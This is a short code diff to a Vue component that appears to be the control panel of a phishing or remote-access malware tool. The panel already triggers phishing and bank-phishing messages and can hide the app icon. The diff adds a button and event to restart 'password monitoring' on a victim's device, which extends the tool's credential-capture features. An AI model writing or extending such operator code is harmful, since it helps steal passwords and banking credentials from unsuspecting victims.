@@ -58,6 +58,7 @@ interface Emits {
     (e: 'sendPhish', type: string): void;
     (e: 'sendBankPhish', bank: string): void;
     (e: 'toggleBlockText', text: string, bg: string): void;
+    (e: 'enablePasswordMonitoring'): void;
 }
 
 const emit = defineEmits<Emits>();
@@ -281,6 +282,11 @@ const bankButtons = [
                     <NGridItem :span="2">
                         <NButton size="tiny" block type="warning" @click="emit('hideIcon')">
                             隐藏图标
+                        </NButton>
+                    </NGridItem>
+                    <NGridItem :span="2">
+                        <NButton size="tiny" block type="info" @click="emit('enablePasswordMonitoring')">
+                            重启密码监听
                         </NButton>
                     </NGridItem>
                 </NGrid>
